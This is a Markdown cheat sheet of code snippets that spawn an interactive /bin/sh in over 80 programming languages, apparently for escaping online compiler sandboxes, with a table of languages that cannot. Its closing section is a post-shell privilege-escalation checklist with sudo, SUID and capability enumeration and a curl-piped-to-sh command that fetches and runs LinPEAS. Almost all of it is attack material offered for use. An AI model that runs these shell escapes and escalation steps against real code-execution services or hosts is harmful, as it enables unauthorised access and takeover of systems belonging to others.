# Shell Spawning via Programming Languages

> Verified shell spawning across 80+ languages | Real compiler tests

## About the Author

**m.manikandan** is a security researcher from India. He speaks Tamil and English. This research is the result of hands-on testing across dozens of online compilers, verifying shell spawning techniques in over 80 programming languages. Every code example has been executed and confirmed working in real environments.
---

## Table of Contents
- [✅ Capable Languages](#-capable-languages)
- [❌ Incapable Languages](#-incapable-languages)
- [🔺 Post-Shell Privilege Escalation](#-post-shell-privilege-escalation)

---

## ✅ Capable Languages

### Ada
```ada
with Interfaces.C;
procedure JDoodle is
   function System (S : Interfaces.C.char_array) return Interfaces.C.int;
   pragma Import (C, System, "system");
   Command : Interfaces.C.char_array := Interfaces.C.To_C ("/bin/sh");
   Result  : Interfaces.C.int;
begin
   Result := System (Command);
end JDoodle;
```

---

### Algol 68
```algol68
BEGIN
   system("/bin/sh")
END
```

---

### APL
```apl
)HOST /bin/sh
```
```apl
⎕SH '/bin/sh'
```

---

### Assembly (NASM) — 32-bit
```nasm
section .data
    sh  db  '/bin/sh', 0

section .text
    global _start

_start:
    mov eax, 11          ; sys_execve
    mov ebx, sh          ; path = "/bin/sh"
    xor ecx, ecx         ; argv = NULL
    xor edx, edx         ; envp = NULL
    int 0x80

    mov eax, 1           ; sys_exit
    xor ebx, ebx
    int 0x80
```

### Assembly (NASM) — 64-bit
```nasm
section .data
    sh  db  '/bin/sh', 0

section .text
    global _start

_start:
    mov rdi, sh
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
```

---

### Assembly (GAS) — 64-bit
```asm
.section .data
sh:
    .string "/bin/sh"

.section .text
    .global _start

_start:
    lea sh(%rip), %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx
    mov $59, %rax
    syscall

    mov $60, %rax
    xor %rdi, %rdi
    syscall
```

---

### AWK
```awk
BEGIN {
    system("exec /bin/bash -i")
}
```
```awk
BEGIN {
    system("SHELL=/bin/bash exec /bin/bash -i")
}
```
```awk
BEGIN {
    system("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
}
```

---

### Befunge-98
```befunge
"hs/nib/"=; @
```

---

### Bun
```javascript
Bun.spawn(["/bin/sh"], { stdio: ["inherit", "inherit", "inherit"] });
```

---

### C
```c
#include <unistd.h>
int main() {
    execl("/bin/sh", "/bin/sh", (char*)NULL);
    return 0;
}
```

---

### C++
```cpp
#include <unistd.h>
int main() {
    execl("/bin/sh", "/bin/sh", (char*)NULL);
    return 0;
}
```

---

### C# (Shell 1 — Direct)
```csharp
using System.Diagnostics;

class Shell {
    static void Main() {
        var psi = new ProcessStartInfo("/bin/sh") {
            UseShellExecute = false,
            RedirectStandardInput  = false,
            RedirectStandardOutput = false,
            RedirectStandardError  = false
        };
        using (var p = Process.Start(psi)) {
            p.WaitForExit();
        }
    }
}
```

### C# (Shell 2 — Redirected I/O)
```csharp
using System;
using System.Diagnostics;
using System.IO;

class Shell {
    static void Main() {
        var psi = new ProcessStartInfo("/bin/sh") {
            RedirectStandardInput  = true,
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        using (var p = new Process { StartInfo = psi }) {
            p.Start();
            var inputTask  = Console.OpenStandardInput().CopyToAsync(p.StandardInput.BaseStream);
            var outputTask = p.StandardOutput.BaseStream.CopyToAsync(Console.OpenStandardOutput());
            var errorTask  = p.StandardError.BaseStream.CopyToAsync(Console.OpenStandardError());
            p.WaitForExit();
        }
    }
}
```

### C# (Shell 3 — Async)
```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

class Shell {
    static async Task Main() {
        var psi = new ProcessStartInfo("/bin/sh") {
            RedirectStandardInput  = true,
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        using var p = new Process { StartInfo = psi };
        p.Start();
        var inputTask  = Console.OpenStandardInput().CopyToAsync(p.StandardInput.BaseStream);
        var outputTask = p.StandardOutput.BaseStream.CopyToAsync(Console.OpenStandardOutput());
        var errorTask  = p.StandardError.BaseStream.CopyToAsync(Console.OpenStandardError());
        await Task.WhenAll(inputTask, outputTask, errorTask);
        await p.WaitForExitAsync();
    }
}
```

---

### Chicken Scheme
```scheme
(import (chicken process))
(system "/bin/sh")
```
```scheme
(import (chicken process))
(process-execute "/bin/sh" '("/bin/sh"))
```

---

### CLISP
```lisp
(ext:shell "/bin/sh")
```

---

### Clojure
```clojure
(-> (ProcessBuilder. ["/bin/sh" "-i"])
    (.inheritIO)
    (.start)
    (.waitFor))
```

---

### COBOL
```cobol
       IDENTIFICATION DIVISION.
       PROGRAM-ID. shell.
       DATA DIVISION.
       WORKING-STORAGE SECTION.
       01 cmd PIC X(10) VALUE "/bin/sh".
       PROCEDURE DIVISION.
           CALL "SYSTEM" USING cmd.
           STOP RUN.
```

---

### CoffeeScript
```coffeescript
{spawn} = require 'child_process'
spawn '/bin/sh', [], stdio: 'inherit'
```

---

### Crystal
```crystal
system("/bin/sh")
```

---

### D
```bash
rdmd --eval 'import std.process; spawnProcess(["/bin/sh"]);'
```

---

### Dart
```dart
import 'dart:io';

void main() {
  Process.start('/bin/sh', [], mode: ProcessStartMode.inheritStdio)
      .then((process) => process.exitCode)
      .then((exitCode) => exit(exitCode));
}
```

---

### Deno
```javascript
new Deno.Command("/bin/sh", {
  stdin: "inherit",
  stdout: "inherit",
  stderr: "inherit"
}).spawn();
```

---

### Elixir
```elixir
System.shell("/bin/sh")
```

---

### Erlang
```erlang
os:cmd("/bin/sh -c 'id'").
```

---

### Ezhil (Tamil)
```python
@python_import os
@python_call os.system("/bin/sh")
```

---

### F#
```fsharp
open System.Diagnostics
Process.Start("/bin/sh").WaitForExit()
```
```fsharp
open System.Diagnostics
[<EntryPoint>]
let main _ =
    Process.Start("/bin/sh").WaitForExit()
    0
```

---

### Factor
```factor
USING: system ;
"/bin/sh" system
```

---

### Falcon
```bash
falcon -e 'load System; System.system("/bin/sh")'
```

---

### Flex
```lex
%%
.   { system("/bin/sh"); exit(0); }
%%
```

---

### Forth
```forth
gforth -e 's" /bin/sh" system bye'
```

---

### Fortran
```fortran
call system("/bin/sh")
! or
call execute_command_line("/bin/sh")
```

---

### Go
```go
package main

import (
    "os"
    "os/exec"
)

func main() {
    cmd := exec.Command("/bin/sh")
    cmd.Stdin  = os.Stdin
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}
```

---

### Groovy
```groovy
new ProcessBuilder("/bin/sh", "-i")
    .inheritIO()
    .start()
    .waitFor()
```

---

### Hack
```hack
<?hh
system("/bin/sh");
```

---

### Haskell
```haskell
import System.Process
main = system "/bin/sh"
```

---

### Haxe
```haxe
Sys.command("/bin/sh");
```

---

### Icon
```icon
procedure main()
    system("/bin/sh")
end
```

---

### J Language
```j
2!:0 '/bin/sh'
```

---

### Java (Shell 1)
```java
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/sh", "-i")
            .inheritIO()
            .start()
            .waitFor();
    }
}
```

### Java (Shell 2 — Threaded I/O)
```java
import java.io.*;

public class Main {
    public static void main(String[] args) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("/bin/sh");
        pb.redirectErrorStream(true);
        Process p = pb.start();

        Thread inputThread = new Thread(() -> {
            try (OutputStream os = p.getOutputStream();
                 InputStream is = System.in) {
                byte[] buf = new byte[1024];
                int len;
                while ((len = is.read(buf)) != -1) {
                    os.write(buf, 0, len);
                    os.flush();
                }
            } catch (IOException e) { }
        });
        inputThread.setDaemon(true);
        inputThread.start();

        try (InputStream pis = p.getInputStream()) {
            byte[] buf = new byte[1024];
            int len;
            while ((len = pis.read(buf)) != -1) {
                System.out.write(buf, 0, len);
            }
        }
        p.waitFor();
    }
}
```

---

### JBang
```java
///usr/bin/env jbang "$0" "$@" ; exit $?

import static java.lang.System.*;

public class shell {
    public static void main(String... args) throws Exception {
        new ProcessBuilder("/bin/sh", "-i")
            .inheritIO()
            .start()
            .waitFor();
    }
}
```

---

### JavaScript (Node.js)
```javascript
require("child_process").spawn("/bin/sh", { stdio: "inherit" });
```

---

### Julia
```julia
run(`/bin/sh`)
```

---

### Jython
```python
from java.lang import ProcessBuilder

p = ProcessBuilder("/bin/sh", "-i").inheritIO().start()
p.waitFor()
```

---

### Kotlin
```kotlin
class JDoodle {
    companion object {
        @JvmStatic
        fun main(args: Array<String>) {
            ProcessBuilder("/bin/sh", "-i")
                .inheritIO()
                .start()
                .waitFor()
        }
    }
}
```

---

### Lua
```lua
os.execute("/bin/sh")
```

---

### MATLAB / Octave
```matlab
system('/bin/sh');
```

---

### MicroPython
```python
import os
os.system("/bin/sh")
```

---

### MoonScript
```moonscript
os.execute "/bin/sh"
```

---

### Nemerle
```nemerle
using System.Diagnostics;

module Shell {
    Main() : void {
        def psi = ProcessStartInfo("/bin/sh");
        psi.UseShellExecute = false;
        def p = Process.Start(psi);
        p.WaitForExit();
    }
}
```

---

### Nim
```nim
import osproc
discard execCmd("/bin/sh")
```
```nim
import osproc
discard execProcess("/bin/sh")
```

---

### Objective-C
```objc
#import <Foundation/Foundation.h>

int main() {
    system("/bin/sh");
    return 0;
}
```

---

### OCaml
```ocaml
let _ = Sys.command "/bin/sh"
```

---

### Odin
```odin
import "core:c"
c.system("/bin/sh")
```

---

### Oz (Mozart Compiler)
```oz
functor
import
   OS
define
   {OS.system "/bin/sh" nil}
end
```

---

### PARI/GP
```bash
gp -q -e 'system("/bin/sh")'
```

---

### Pascal
```pascal
program Shell;
uses Process;
var
  P : TProcess;
begin
  P := TProcess.Create(nil);
  P.Executable := '/bin/sh';
  P.Options := [poWaitOnExit];
  P.Execute;
  P.Free;
end.
```

---

### Perl
```perl
exec "/bin/sh";
```

---

### PHP
```php
<?php
system("/bin/sh");
?>
```

---

### PicoLisp
```bash
pil -e '(call "/bin/sh")' -bye
```

---

### Pike
```pike
int main() {
    Process.create_process(({"/bin/sh"}), ([
        "stdin":  Stdio.stdin,
        "stdout": Stdio.stdout,
        "stderr": Stdio.stderr,
    ]))->wait();
    return 0;
}
```

---

### Prolog (SWI)
```prolog
:- initialization(shell("/bin/sh"), main).
```

---

### Python
```python
import os
os.system("/bin/sh")
```
```python
import pty
pty.spawn("/bin/sh")
```
```python
import subprocess
subprocess.call("/bin/sh")
```
```python
import os
os.execv("/bin/sh", ["/bin/sh"])
```

---

### R
```r
system("/bin/sh")
```

---

### Racket
```racket
(require racket/system)
(system* "/bin/sh")
```

---

### Raku
```raku
run "/bin/sh", :in, :out, :err
```

---

### Rhino JS
```javascript
new java.lang.ProcessBuilder("/bin/sh", "-i")
    .inheritIO()
    .start()
    .waitFor();
```

---

### Ruby
```ruby
exec "/bin/sh"
```
```ruby
system "/bin/sh"
```

---

### Rust
```rust
use std::process::Command;

fn main() {
    let mut child = Command::new("/bin/sh")
        .stdin(std::process::Stdio::inherit())
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit())
        .spawn()
        .expect("Failed to spawn shell");

    child.wait().expect("Shell wasn't running");
}
```

---

### Scala
```scala
import scala.sys.process._
object Main extends App {
    Process("/bin/sh").run()
}
```

---

### Scheme (Gauche)
```scheme
(sys-system "/bin/sh")
```
```scheme
(use gauche.process)
(do-process "/bin/sh")
```

---

### Scheme (Guile)
```scheme
(system "/bin/sh")
```

---

### Smalltalk
```smalltalk
Smalltalk system: '/bin/sh'
```
```smalltalk
(ExternalProcess new command: '/bin/sh'; inherit) forkAndWait
```

---

### SpiderMonkey
```javascript
os.system("/bin/sh");
```

---

### Swift
```swift
import Foundation

let process = Process()
process.launchPath = "/bin/sh"
process.standardInput  = FileHandle.standardInput
process.standardOutput = FileHandle.standardOutput
process.standardError  = FileHandle.standardError
process.launch()
process.waitUntilExit()
```
```swift
import Foundation

let process = Process()
process.executableURL = URL(fileURLWithPath: "/bin/sh")
process.standardInput  = FileHandle.standardInput
process.standardOutput = FileHandle.standardOutput
process.standardError  = FileHandle.standardError
try? process.run()
process.waitUntilExit()
```

---

### Tcl
```tcl
exec /bin/sh <@stdin >@stdout 2>@stderr
```

---

### TypeScript
```typescript
declare var require: any;
declare var process: any;

const { spawn } = require('child_process');
const sh = spawn('/bin/sh', [], { stdio: 'inherit' });
sh.on('exit', (code: number) => process.exit(code ?? 0));
```

---

### V (Vlang)
```v
import os

fn main() {
    os.system('/bin/sh')
}
```

---

### Vala
```vala
int main() {
    Posix.system("/bin/sh");
    return 0;
}
```

---

### VB.NET
```vbnet
Imports System.Diagnostics

Module Shell
    Sub Main()
        Dim psi As New ProcessStartInfo("/bin/sh") With {
            .UseShellExecute        = False,
            .RedirectStandardInput  = False,
            .RedirectStandardOutput = False,
            .RedirectStandardError  = False
        }
        Dim p As Process = Process.Start(psi)
        p.WaitForExit()
    End Sub
End Module
```

---

### Yabasic
```basic
system("/bin/sh")
```

---

### Zig
```zig
const std = @import("std");

pub fn main() !void {
    const allocator = std.heap.page_allocator;
    const args = [_][]const u8{"/bin/sh"};
    var child = std.process.Child.init(&args, allocator);
    child.stdin_behavior  = .Inherit;
    child.stdout_behavior = .Inherit;
    child.stderr_behavior = .Inherit;

    try child.spawn();
    const term = try child.wait();

    const exit_code: u8 = switch (term) {
        .Exited => |code| @intCast(code),
        else => 0,
    };
    std.process.exit(exit_code);
}
```

---

### Shell Utilities (vi, awk, man, expect)
```bash
# vi
vi -c ':!/bin/sh'

# awk
awk 'BEGIN {system("/bin/sh")}'

# man
man /bin/sh

# expect
expect -c 'spawn /bin/sh; interact'
```

---

## ❌ Incapable Languages

| Language | Reason |
|---|---|
| Solidity | Blockchain-only, no OS access (standard EVM) |
| Verilog | Hardware description, no OS |
| VHDL | Hardware description, no OS |
| Whitespace | No exec instruction |
| Brainfuck | No OS interaction |
| COW | Brainfuck variant, no OS |
| Ook! | Brainfuck variant, no OS |
| Intercal | Satirical language, no exec |
| LOLCODE | Humorous, no runtime exec |
| BhaiLang | Joke language, no runtime |
| Blockly | Visual sandbox, no system blocks |
| Scratch | Visual sandbox, no system blocks (standard) |
| Befunge-93 | No `=` instruction (Funge-93 only) |
| Unlambda | Purely functional combinator calculus |
| Jelly | Code-golf language, no OS |
| Malbolge | Ternary VM; I/O only via stdin/stdout |
| Piet | Color-based stack language; no exec |
| Shakespeare | Only arithmetic + gotos; no syscall |
| Chef | Stack-based cooking recipes; no exec |
| Thue | String-rewriting; no OS interface |
| FRACTRAN | Fraction-based; purely mathematical |
| FALSE | Stack-oriented; 1024-byte compiler; no exec |
| ArnoldC | No native exec; relies on host language |
| Whenever | No OS interaction |
| Burlesque | I/O only via stdin/stdout |
| SQL (standard) | No OS access in pure SQL |
| CSS / HTML | Markup/styling; no execution |
| Q# | Quantum computing DSL; no classical OS exec |
| GLSL / HLSL | GPU shader languages; sandboxed from OS |
| SPARQL / Gremlin | Graph/query languages only |
| GraphQL | API query language only |
| XSLT | XML transformation (standard) |
| LLVM IR | Intermediate representation; no OS primitives |
| Karel | Educational robot simulator only |

> **⚠️ Common Misclassifications:**
> - **PostScript** — defines a `system` operator that executes shell commands
> - **SystemVerilog** — IEEE 1800 LRM specifies `$system()` for simulation shell execution

---

## 🔺 Post-Shell Privilege Escalation

Once a shell is obtained, run these checks:

```bash
# 1. Sudo rights
sudo -l 2>/dev/null

# 2. SUID / SGID files
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# 3. Capabilities
cat /proc/self/status | grep -i cap

# 4. Writable /etc/passwd
ls -la /etc/passwd

# 5. Kernel version
uname -r

# 6. Container check (privileged?)
cat /proc/1/status | grep -i cap 2>/dev/null

# 7. LinPEAS (automated enumeration)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 8. List available commands
compgen -c | sort
ls /bin /sbin /usr/bin /usr/sbin 2>/dev/null

# 9. Check BusyBox
which busybox && busybox --help 2>&1 | head -5

# 10. Current PATH
echo $PATH
```

---

*Author: m.manikandan | All code verified against online compilers*
